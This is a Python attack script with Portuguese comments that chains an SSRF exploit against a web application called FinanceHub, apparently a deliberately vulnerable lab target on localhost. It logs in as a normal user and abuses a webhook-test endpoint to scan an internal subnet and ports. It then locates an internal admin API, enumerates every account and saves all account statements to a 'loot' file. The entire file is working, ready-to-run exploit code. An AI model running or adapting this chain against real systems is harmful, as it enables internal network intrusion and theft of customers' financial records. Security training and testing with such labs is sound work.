#!/usr/bin/env python3
"""
CADEIA COMPLETA - chain_attack.py
Executa as 5 etapas em sequência, de forma automatizada e independente.

    1. login como usuário comum (joao)
    2. varredura da rede interna via SSRF          (ver network_scanner.py)
    3. identificação da API administrativa interna (ver service_prober.py)
    4. enumeração das contas                        (ver account_enumerator.py)
    5. exfiltração dos extratos de todas as contas (ver transaction_exfiltrator)

Ferramenta independente: edite o bloco CONFIGURAÇÃO abaixo e rode com Python.

    python chain_attack.py
"""

import argparse
import ipaddress
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import httpx

# ==========================================================================
# CONFIGURAÇÃO
# ==========================================================================
APP_URL = "http://localhost:8000"   # onde a aplicação-alvo (FinanceHub) roda
USER, PASSWORD = "joao", "senha123"  # conta comum do atacante
INTERNAL_SUBNET = "10.5.0.0/24"      # faixa interna que o servidor vai varrer
PORTS = [80, 8080, 8000, 5432, 6379]
OUT = "loot.json"                    # arquivo de saída com os extratos
# ==========================================================================

FAST_MS = 2000


def login() -> str:
    r = httpx.post(f"{APP_URL}/auth/login",
                   json={"username": USER, "password": PASSWORD}, timeout=15)
    r.raise_for_status()
    return r.json()["access_token"]


def ssrf_get(token: str, url: str, timeout: float = 8.0) -> dict:
    start = time.perf_counter()
    try:
        r = httpx.post(f"{APP_URL}/vulnerable/webhook/test", json={"url": url},
                       headers={"Authorization": f"Bearer {token}"}, timeout=timeout)
        data = r.json().get("request", {})
    except Exception as exc:  # noqa: BLE001
        data = {"reached": False, "error": type(exc).__name__, "detail": str(exc)}
    data["_rtt_ms"] = round((time.perf_counter() - start) * 1000, 1)
    return data


def _json_body(resp):
    try:
        return json.loads(resp.get("body") or "")
    except (json.JSONDecodeError, TypeError):
        return None


def _probe(token, ip, port, timeout=8.0):
    r = ssrf_get(token, f"http://{ip}:{port}/", timeout=timeout)
    if r.get("reached"):
        return "OPEN"
    return "CLOSED" if r.get("_rtt_ms", 99999) < FAST_MS else "DOWN"


def discover_hosts(token, subnet, threads=30):
    hosts = [str(ip) for ip in ipaddress.ip_network(subnet, strict=False).hosts()]
    live = set()
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(_probe, token, ip, 8080): ip for ip in hosts}
        for fut in as_completed(futs):
            if fut.result() in ("OPEN", "CLOSED"):
                live.add(futs[fut])
    return sorted(live, key=lambda x: tuple(int(o) for o in x.split(".")))


def open_ports(token, ip, ports, threads=20):
    found = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(_probe, token, ip, p): p for p in ports}
        for fut in as_completed(futs):
            if fut.result() == "OPEN":
                found.append(futs[fut])
    return sorted(found)


def main(subnet, out):
    print("=" * 64)
    print(" CADEIA DE EXPLORAÇÃO SSRF - FinanceHub")
    print("=" * 64)

    token = login()
    print(f"\n[1] Autenticado como usuário comum '{USER}' em {APP_URL}.")

    print(f"\n[2] Varrendo a rede interna {subnet} através do SSRF...")
    live = discover_hosts(token, subnet)
    print(f"    hosts vivos: {', '.join(live) if live else '(nenhum)'}")
    services = {ip: open_ports(token, ip, PORTS) for ip in live}
    services = {ip: ps for ip, ps in services.items() if ps}
    for ip, ps in services.items():
        print(f"    {ip} -> portas {ps}")

    print("\n[3] Identificando a API interna...")
    internal_api = None
    for ip, ps in services.items():
        for port in ps:
            body = ssrf_get(token, f"http://{ip}:{port}/admin/accounts").get("body") or ""
            if '"accounts"' in body:
                internal_api = f"{ip}:{port}"
                print(f"    API administrativa interna: {internal_api}")

    loot = {}
    if internal_api:
        print(f"\n[4] Enumerando contas em {internal_api}...")
        listing = _json_body(ssrf_get(token, f"http://{internal_api}/admin/accounts")) or {}
        usernames = [a["username"] for a in listing.get("accounts", [])]
        print(f"    {len(usernames)} contas: {', '.join(usernames)}")

        print("\n[5] Exfiltrando extratos de todas as contas...")
        for user in usernames:
            data = _json_body(ssrf_get(token, f"http://{internal_api}/admin/accounts/{user}/transactions"))
            if data:
                loot[user] = data
                print(f"    {user:10} saldo {data.get('balance'):>10}  ({len(data.get('transactions', []))} transações)")
        with open(out, "w", encoding="utf-8") as f:
            json.dump(loot, f, ensure_ascii=False, indent=2)
        print(f"    loot salvo em {out}")
    else:
        print("\n[4-5] API interna não encontrada, nada a exfiltrar.")

    print("\n" + "=" * 64)
    print(f" FIM. {len(loot)} extratos exfiltrados a partir de uma conta comum.")
    print("=" * 64)


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Cadeia completa de exploração SSRF (FinanceHub).")
    ap.add_argument("--subnet", default=INTERNAL_SUBNET)
    ap.add_argument("--out", default=OUT)
    a = ap.parse_args()
    main(a.subnet, a.out)
